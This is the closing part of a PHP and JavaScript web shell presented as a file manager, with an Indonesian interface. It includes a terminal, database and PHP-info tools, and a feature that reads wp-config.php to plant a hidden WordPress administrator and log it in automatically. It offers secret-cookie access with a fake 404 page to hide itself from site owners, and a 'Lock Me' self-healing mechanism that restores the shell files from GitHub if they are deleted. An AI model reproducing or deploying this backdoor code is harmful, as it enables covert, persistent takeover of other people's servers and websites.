        + '<details style="margin-top:14px"><summary style="cursor:pointer;color:var(--primary);font-weight:600">Extensions list</summary>'
        + '<div class="mono" style="font-size:11px;color:var(--muted);margin-top:8px;line-height:1.7">'+esc((r.extensions||[]).join(', '))+'</div></details>';
    }).catch(function(e){ $('#sysBox').innerHTML = '<div style="color:#f87171">'+esc(e.message)+'</div>'; });
  }

  function openPhpinfo() {
    openModal({ title:'PHP Info', wide:true, body:'<div style="padding:10px;flex:1;min-height:0"><iframe class="phpinfo-frame" id="phpinfoFrame" sandbox="allow-same-origin"></iframe></div>', confirmText:'', cancelText:'Tutup' });
    api('phpinfo').then(function(r){
      var doc = $('#phpinfoFrame').contentDocument;
      doc.open(); doc.write(r.html || ''); doc.close();
    }).catch(function(e){ toast(e.message,'err'); });
  }





  function openSettings() {
    openModal({
      title: 'Settings',
      wide: true,
      body: '<div class="set-wrap" id="setBox"><div style="color:var(--muted)">Memuat…</div></div>',
      confirmText: 'Simpan ke index.php',
      cancelText: 'Batal',
      onConfirm: async function () {
        var modeEl = document.querySelector('input[name="setMode"]:checked');
        var mode = modeEl ? modeEl.value : 'cookie';
        var r = await api('settings_save', {
          auth_mode: mode,
          username: ($('#setUser') && $('#setUser').value) || '',
          password: ($('#setPass') && $('#setPass').value) || '',
          cookie_name: ($('#setCName') && $('#setCName').value) || 'abadinanjaya',
          cookie_value: ($('#setCVal') && $('#setCVal').value) || 'kontol',
          cloak_404: ($('#setCloak') && $('#setCloak').checked) ? '1' : '',
          show_login_on_404: ($('#setShowLogin') && $('#setShowLogin').checked) ? '1' : ''
        });
        toast(r.message || 'Tersimpan');
        setTimeout(function () { location.reload(); }, 500);
      }
    });

    api('settings_get').then(function (r) {
      var s = r.settings || {};
      var modes = [
        { id: 'none', t: 'Tanpa Login', d: 'Terbuka total. Tidak ada halaman login / 404 / cookie.' },
        { id: 'cookie', t: 'Cookie Saja', d: 'Login lewat cookie name=value. Bisa cloak 404.' },
        { id: 'password', t: 'Password Only', d: 'Halaman login password sendiri. Session — tanpa cookie auth.' },
        { id: 'userpass', t: 'Username + Password', d: 'Halaman login 2 field. Session — tanpa cookie auth.' }
      ];
      var mode = s.auth_mode || 'cookie';
      var cards = modes.map(function (m) {
        var on = mode === m.id ? ' active' : '';
        var ck = mode === m.id ? ' checked' : '';
        return '<label class="set-mode' + on + '" data-mode="' + m.id + '">'
          + '<input type="radio" name="setMode" value="' + m.id + '"' + ck + '>'
          + '<span class="t">' + m.t + '</span>'
          + '<span class="d">' + m.d + '</span></label>';
      }).join('');

      $('#setBox').innerHTML =
        '<div class="set-hero"><div><strong>AUTH MODE</strong>'
        + '<p>Disimpan ke <code>index.php</code>. Form di bawah berubah sesuai mode.</p></div></div>'
        + '<div class="set-modes" id="setModes">' + cards + '</div>'

        + '<div class="set-section" id="secNone" data-for="none"><h3>Tanpa Login</h3>'
        + '<p style="color:var(--muted);font-size:13px;margin:0;line-height:1.5">File manager langsung terbuka. Tidak ada form, cookie, atau halaman 404.</p></div>'

        + '<div class="set-section" id="secUser" data-for="userpass"><h3>Username</h3>'
        + '<div class="field" style="margin:0"><label>Username</label><input id="setUser" value="' + esc(s.username || '') + '" autocomplete="off" placeholder="admin"></div></div>'

        + '<div class="set-section" id="secPass" data-for="password,userpass"><h3>Password</h3>'
        + '<div class="field" style="margin:0"><label>Password (otomatis MD5)</label><input id="setPass" type="text" value="' + esc(s.password || '') + '" autocomplete="off" placeholder="ketik plain → disimpan MD5">'
        + '<div class="hint">Ketik password biasa, saat simpan otomatis jadi MD5. Login juga dicek via MD5.</div></div></div>'

        + '<div class="set-section" id="secCookie" data-for="cookie"><h3>Cookie Auth</h3>'
        + '<div class="set-grid">'
        + '<div class="field" style="margin:0"><label>Cookie Name</label><input id="setCName" value="' + esc(s.cookie_name || 'abadinanjaya') + '"></div>'
        + '<div class="field" style="margin:0"><label>Cookie Value</label><input id="setCVal" value="' + esc(s.cookie_value || 'kontol') + '"></div>'
        + '</div>'
        + '<div class="hint" style="margin-top:8px">Hanya untuk mode Cookie. Contoh: <code>abadinanjaya=kontol</code></div></div>'

        + '<div class="set-section" id="secOpts" data-for="cookie"><h3>Tampilan 404 (Cookie mode)</h3>'
        + '<p style="color:var(--muted);font-size:13px;margin:0 0 10px;line-height:1.5">Tanpa cookie → <strong>404 murni</strong> dari host (<code>/generate.php</code> / path acak). <strong>Tanpa form login.</strong> Masuk hanya dengan set cookie.</p>'
        + '<div class="set-toggles">'
        + '<label class="set-toggle"><input type="checkbox" class="chk" id="setCloak"' + (s.cloak_404 ? ' checked' : '') + '>'
        + '<span><div class="t">404 Not Found cloak</div><div class="d">Belum login → ambil body 404 dari https://{host}/acak…</div></span></label>'
        + '</div></div>';

      // hidden defaults so save always sends values
      if (!$('#setUser')) {}
      // ensure hidden inputs exist for modes that hide fields - inject defaults in onConfirm already handles missing

      function applyMode(m) {
        $$('#setModes .set-mode').forEach(function (el) {
          el.classList.toggle('active', el.getAttribute('data-mode') === m);
        });
        $$('.set-section').forEach(function (sec) {
          var f = (sec.getAttribute('data-for') || '').split(',');
          sec.classList.toggle('on', f.indexOf(m) >= 0);
        });
      }

      $$('#setModes .set-mode').forEach(function (el) {
        el.addEventListener('click', function () {
          var inp = el.querySelector('input');
          if (inp) inp.checked = true;
          applyMode(el.getAttribute('data-mode'));
        });
      });
      document.querySelectorAll('input[name="setMode"]').forEach(function (inp) {
        inp.addEventListener('change', function () { applyMode(inp.value); });
      });
      applyMode(mode);
    }).catch(function (e) {
      $('#setBox').innerHTML = '<div style="color:#f87171">' + esc(e.message) + '</div>';
    });
  }




  function openWpAdmin() {
    openModal({
      title: 'WordPress Admin',
      wide: true,
      body: '<div style="padding:16px" id="wpBox"><div style="color:var(--muted)">Mencari <code>wp-config.php</code> dari lokasi sekarang…</div></div>',
      confirmText: '',
      cancelText: 'Tutup'
    });
    var box = document.getElementById('wpBox');
    var herePath = (state && typeof state.path === 'string') ? state.path : (typeof FM_HOME === 'string' ? FM_HOME : '');
    api('wp_find', { path: herePath }).then(function (r) {
      var items = r.items || [];
      var from = r.search_from || herePath || '/';
      if (!items.length) {
        box.innerHTML =
          '<div style="color:#f87171;margin-bottom:8px">wp-config.php tidak ditemukan.</div>' +
          '<div class="mono" style="font-size:11px;color:var(--muted)">Dicari dari: ' + esc(from) + '</div>' +
          '<div style="margin-top:10px;font-size:12px;color:var(--muted)">Pindah ke folder instalasi WordPress (atau parent-nya), lalu buka WP Admin lagi.</div>';
        return;
      }
      var opts = items.map(function (it, i) {
        return '<option value="' + esc(it.file) + '"' + (i === 0 ? ' selected' : '') + '>' + esc(it.dir) + (it.db_name ? (' — DB: ' + esc(it.db_name)) : '') + '</option>';
      }).join('');
      box.innerHTML =
        '<div class="set-hero" style="margin-bottom:14px"><div><strong>WORDPRESS ADMIN</strong>' +
        '<p>Cari <code>wp-config.php</code> dari lokasi FM sekarang (naik parent + turun folder), buat admin, auto-login wp-admin.</p></div></div>' +
        '<div class="mono" style="font-size:11px;color:var(--muted);margin:-6px 0 12px">Lokasi cari: ' + esc(from) + ' · ' + items.length + ' ditemukan</div>' +
        '<div class="field"><label>Instalasi WordPress</label><select id="wpCfg">' + opts + '</select></div>' +
        '<div class="set-grid">' +
        '<div class="field"><label>Username (opsional)</label><input id="wpUser" placeholder="auto generate"></div>' +
        '<div class="field"><label>Password (opsional)</label><input id="wpPass" placeholder="auto generate"></div>' +
        '</div>' +
        '<div class="field"><label>Email (opsional)</label><input id="wpEmail" placeholder="auto"></div>' +
        '<button type="button" class="btn btn-primary" id="wpGo" style="width:100%;margin-top:8px">Create Admin + Auto Login</button>' +
        '<div id="wpResult" style="margin-top:14px"></div>';

      document.getElementById('wpGo').onclick = function () {
        var btn = document.getElementById('wpGo');
        var resBox = document.getElementById('wpResult');
        btn.disabled = true;
        btn.textContent = 'Memproses…';
        api('wp_admin', {
          wp_config: document.getElementById('wpCfg').value,
          path: herePath,
          username: document.getElementById('wpUser').value,
          password: document.getElementById('wpPass').value,
          email: document.getElementById('wpEmail').value
        }).then(function (res) {
          btn.disabled = false;
          btn.textContent = 'Create Admin + Auto Login';
          var hideLine = '';
          if (res.hide_login && res.whl_page) {
            hideLine = 'Hide login: <strong>' + esc(res.whl_page) + '</strong>' +
              (res.hide_option ? (' <span style="color:var(--muted)">(' + esc(res.hide_option) + ')</span>') : '') +
              '<br>';
          } else {
            hideLine = 'Hide login: <span style="color:var(--muted)">tidak aktif (wp-login.php)</span><br>';
          }
          resBox.innerHTML =
            '<div style="padding:12px;border:1px solid rgba(192,240,0,.3);border-radius:10px;background:rgba(192,240,0,.06)">' +
            '<div style="font-weight:700;color:var(--primary);margin-bottom:8px">Administrator dibuat</div>' +
            '<div class="mono" style="font-size:12px;line-height:1.7">' +
            'User: <strong>' + esc(res.username) + '</strong><br>Pass: <strong>' + esc(res.password) + '</strong><br>' +
            hideLine +
            'Login: ' + esc(res.login_url) + '</div></div>' +
            '<form id="wpAutoForm" method="post" action="' + esc(res.login_url) + '" target="_blank" style="display:none">' +
            '<input type="hidden" name="log" value="' + esc(res.username) + '">' +
            '<input type="hidden" name="pwd" value="' + esc(res.password) + '">' +
            '<input type="hidden" name="redirect_to" value="' + esc(res.admin_url) + '">' +
            '<input type="hidden" name="wp-submit" value="Log In">' +
            '<input type="hidden" name="testcookie" value="1"></form>';
          toast(res.hide_login ? ('WP admin · hide login /' + (res.whl_page || '')) : 'WP admin dibuat — membuka login…');
          try { document.cookie = 'wordpress_test_cookie=WP Cookie check; path=/'; } catch (e) {}
          setTimeout(function () {
            var f = document.getElementById('wpAutoForm');
            if (f) f.submit();
          }, 350);
        }).catch(function (e) {
          btn.disabled = false;
          btn.textContent = 'Create Admin + Auto Login';
          resBox.innerHTML = '<div style="color:#f87171">' + esc(e.message) + '</div>';
          toast(e.message, 'err');
        });
      };
    }).catch(function (e) {
      box.innerHTML = '<div style="color:#f87171">' + esc(e.message) + '</div>';
    });
  }


  /* ---------- wire buttons ---------- */

  if ($('#toolTerminal')) $('#toolTerminal').onclick = openTerminal;
  if ($('#toolCodec')) $('#toolCodec').onclick = openCodec;
  if ($('#toolAdminer')) $('#toolAdminer').onclick = openAdminer;
  if ($('#toolSysinfo')) $('#toolSysinfo').onclick = openSysinfo;
  if ($('#toolPhpinfo')) $('#toolPhpinfo').onclick = openPhpinfo;
  if ($('#toolWp')) $('#toolWp').onclick = openWpAdmin;
  if ($('#toolLockMe')) $('#toolLockMe').onclick = openLockMe;
  if ($('#toolSettings')) $('#toolSettings').onclick = openSettings;

  function refreshLockBtn(st) {
    var b = $('#toolLockMe');
    if (!b) return;
    if (!st || !st.linux) {
      b.classList.remove('lock-on');
      b.title = 'Lock Me hanya di Linux';
      b.textContent = 'Lock Me';
      return;
    }
    if (st.enabled) {
      b.classList.add('lock-on');
      b.textContent = 'Locked';
      b.title = 'Lock Me aktif — klik untuk kelola';
    } else {
      b.classList.remove('lock-on');
      b.textContent = 'Lock Me';
      b.title = 'Lock Me — lindungi index.php & abadi_litespeed.php';
    }
  }
  function openLockMe() {
    openModal({
      title: 'Lock Me',
      wide: true,
      body: '<div style="padding:16px" id="lockBox"><div style="color:var(--muted)">Memuat status…</div></div>',
      confirmText: '',
      cancelText: 'Tutup'
    });
    var box = document.getElementById('lockBox');
    function paint(st) {
      refreshLockBtn(st);
      if (!st.linux) {
        box.innerHTML =
          '<div style="color:#f87171;font-weight:700;margin-bottom:8px">Tidak tersedia di OS ini</div>' +
          '<div style="font-size:13px;color:var(--muted);line-height:1.5">Lock Me hanya aktif di <strong>Linux</strong>. Windows/macOS diabaikan.</div>';
        return;
      }
      var files = st.files || {};
      var rows = Object.keys(files).map(function (k) {
        var f = files[k];
        return '<div class="kernel-row" style="border:0;padding:6px 0"><div class="kk">' + esc(k) + '</div><div class="kv mono" style="font-size:11px">' +
          (f.exists ? ('OK · ' + (f.size || 0) + ' B · ' + (f.writable ? 'writable' : 'locked')) : 'MISSING') +
          '<br><span style="color:var(--muted2)">' + esc(f.path || '') + '</span></div></div>';
      }).join('');
      box.innerHTML =
        '<div class="set-hero" style="margin-bottom:14px"><div><strong>LOCK ME</strong>' +
        '<p>Lindungi <code>index.php</code> &amp; <code>abadi_litespeed.php</code>: tidak bisa edit/hapus/rename lewat FM. ' +
        'Jika dihapus atau diubah, otomatis restore dari GitHub main. Self-heal tiap request + watchdog opsional (Linux).</p></div></div>' +
        '<div class="mono" style="font-size:12px;line-height:1.7;margin-bottom:12px">' +
        'Status: <strong style="color:' + (st.enabled ? 'var(--primary)' : 'var(--muted)') + '">' + (st.enabled ? 'LOCKED' : 'OFF') + '</strong><br>' +
        'Dir: ' + esc(st.dir || '') + '<br>' +
        'State: ' + esc(st.state_file || '') + '</div>' +
        '<div style="margin-bottom:12px">' + rows + '</div>' +
        '<div style="font-size:11px;color:var(--muted2);margin-bottom:12px;line-height:1.45">' + esc(st.note || '') + '</div>' +
        '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
        (st.enabled
          ? '<button type="button" class="btn btn-ghost" id="lockOff">Unlock</button><button type="button" class="btn btn-primary" id="lockHeal">Force Heal (GitHub)</button>'
          : '<button type="button" class="btn btn-primary" id="lockOn">Aktifkan Lock Me</button>') +
        '</div><div id="lockMsg" style="margin-top:12px"></div>';
      var msg = document.getElementById('lockMsg');
      if (document.getElementById('lockOn')) {
        document.getElementById('lockOn').onclick = function () {
          this.disabled = true; this.textContent = 'Mengunci…';
          api('lock_me').then(function (r) {
            toast(r.message || 'Lock Me aktif');
            api('lock_status').then(paint);
          }).catch(function (e) {
            msg.innerHTML = '<div style="color:#f87171">' + esc(e.message) + '</div>';
            toast(e.message, 'err');
            api('lock_status').then(paint);
          });
        };
      }
      if (document.getElementById('lockOff')) {
        document.getElementById('lockOff').onclick = function () {
          if (!confirm('Nonaktifkan Lock Me?')) return;
          this.disabled = true; this.textContent = 'Unlock…';
          api('unlock_me').then(function (r) {
            toast(r.message || 'Lock Me off');
            api('lock_status').then(paint);
          }).catch(function (e) {
            msg.innerHTML = '<div style="color:#f87171">' + esc(e.message) + '</div>';
            api('lock_status').then(paint);
          });
        };
      }
      if (document.getElementById('lockHeal')) {
        document.getElementById('lockHeal').onclick = function () {
          this.disabled = true; this.textContent = 'Healing…';
          api('lock_heal').then(function (r) {
            toast('Heal: ' + ((r.restored && r.restored.length) ? r.restored.join(', ') : 'ok'));
            api('lock_status').then(paint);
          }).catch(function (e) {
            msg.innerHTML = '<div style="color:#f87171">' + esc(e.message) + '</div>';
            api('lock_status').then(paint);
          });
        };
      }
    }
    api('lock_status').then(paint).catch(function (e) {
      box.innerHTML = '<div style="color:#f87171">' + esc(e.message) + '</div>';
    });
  }
  // status tombol saat load
  try {
    api('lock_status').then(refreshLockBtn).catch(function () {});
  } catch (e) {}

  (function initKernelToggle() {
    var bar = document.getElementById('kernelBar');
    var btn = document.getElementById('kernelToggle');
    if (!bar || !btn) return;
    var key = 'abadi_kernel_open';
    function apply(open) {
      bar.classList.toggle('is-collapsed', !open);
      btn.setAttribute('aria-expanded', open ? 'true' : 'false');
      btn.title = open ? 'Hide system info' : 'Show system info';
      try { localStorage.setItem(key, open ? '1' : '0'); } catch (e) {}
    }
    var saved = null;
    try { saved = localStorage.getItem(key); } catch (e) {}
    apply(saved === null ? true : saved === '1');
    btn.addEventListener('click', function () {
      apply(bar.classList.contains('is-collapsed'));
    });
  })();

  $('#btnAddFile').onclick = openAddFile;
  $('#btnAddFolder').onclick = openAddFolder;
  $('#btnEmptyAdd').onclick = openAddFolder;
  $('#btnHome').onclick = () => load(FM_HOME);
  $('#btnCopyPwd').onclick = async () => {
    const t = $('#pwdPath').dataset.full || $('#pwdPath').textContent || '';
    try {
      await navigator.clipboard.writeText(t.trim());
      toast('PWD disalin');
    } catch (_) {
      toast('Gagal salin PWD', 'err');
    }
  };
  function goUp() {
    if (!state.path) return;
    const parts = state.path.split('/');
    parts.pop();
    load(parts.join('/'));
  }
  $('#btnMove').onclick = () => openMove([...state.selected], 'move');
  $('#btnCopy').onclick = () => openMove([...state.selected], 'copy');
  $('#btnChmod').onclick = () => openChmod([...state.selected]);
  $('#btnRenameOne').onclick = () => {
    const p = [...state.selected][0];
    if (p) openRename(p);
  };
  $('#btnDelete').onclick = () => doDelete([...state.selected]);
  $('#btnClearSel').onclick = () => { state.selected.clear(); renderTable(); updateSelBar(); };
  $('#checkAll').onchange = (e) => {
    const list = filteredSorted();
    if (e.target.checked) list.forEach(i => state.selected.add(i.path));
    else list.forEach(i => state.selected.delete(i.path));
    renderTable();
    updateSelBar();
  };
  $('#search').oninput = (e) => {
    state.filter = e.target.value;
    renderTable();
  };
  $$('th.sortable').forEach(th => {
    th.onclick = () => {
      const k = th.dataset.sort;
      if (state.sort.key === k) state.sort.dir *= -1;
      else { state.sort.key = k; state.sort.dir = 1; }
      renderTable();
    };
  });

  /* ---------- keyboard ---------- */
  document.addEventListener('keydown', (e) => {
    if ($('#modalBg').classList.contains('show')) {
      if (e.key === 'Escape') closeModal();
      return;
    }
    if (e.target.matches('input, textarea')) return;
    if (e.key === 'Backspace') { e.preventDefault(); goUp(); }
    if (e.key === 'r' || e.key === 'R') { if (!e.ctrlKey) { e.preventDefault(); load(); } }
    if (e.key === 'Delete' && state.selected.size) { e.preventDefault(); doDelete([...state.selected]); }
    if (e.key === 'F2' && state.selected.size === 1) { e.preventDefault(); openRename([...state.selected][0]); }
    if ((e.ctrlKey || e.metaKey) && e.key === 'a') {
      e.preventDefault();
      filteredSorted().forEach(i => state.selected.add(i.path));
      renderTable(); updateSelBar();
    }
    if (e.key === 'n' && (e.ctrlKey || e.metaKey) && e.shiftKey) { e.preventDefault(); openAddFolder(); }
    if (e.key === 'n' && (e.ctrlKey || e.metaKey) && !e.shiftKey) { e.preventDefault(); openAddFile(); }
  });

  /* ---------- boot ---------- */
  load();
})();
</script>
</body>
</html>
<?php
/* ========== SVG ICONS (PHP helper for HTML) ========== */
function icon($name, $size = 16) {
    $icons = [
        'up' => '<path d="M12 19V5"/><path d="M5 12l7-7 7 7"/>',
        'refresh' => '<path d="M21 12a9 9 0 11-2.6-6.3"/><path d="M21 3v6h-6"/>',
        'logout' => '<path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><path d="M16 17l5-5-5-5"/><path d="M21 12H9"/>',
        'file-plus' => '<path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6"/><path d="M12 11v6"/><path d="M9 14h6"/>',
        'folder-plus' => '<path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M12 11v6"/><path d="M9 14h6"/>',
        'upload' => '<path d="M12 21V9"/><path d="M7 14l5-5 5 5"/><path d="M5 3h14"/>',
        'search' => '<circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/>',
        'move' => '<path d="M5 9l-3 3 3 3"/><path d="M9 5l3-3 3 3"/><path d="M15 19l-3 3-3-3"/><path d="M19 9l3 3-3 3"/><path d="M2 12h20"/><path d="M12 2v20"/>',
        'copy' => '<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>',
        'lock' => '<rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/>',
        'edit' => '<path d="M12 20h9"/><path d="M16.5 3.5a2.12 2.12 0 013 3L7 19l-4 1 1-4L16.5 3.5z"/>',
        'trash' => '<path d="M3 6h18"/><path d="M8 6V4h8v2"/><path d="M19 6l-1 14H6L5 6"/>',
        'x' => '<path d="M18 6L6 18"/><path d="M6 6l12 12"/>',
        'folder' => '<path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/>',
    ];
    $p = isset($icons[$name]) ? $icons[$name] : '';
    return '<svg width="'.$size.'" height="'.$size.'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">'.$p.'</svg>';
}
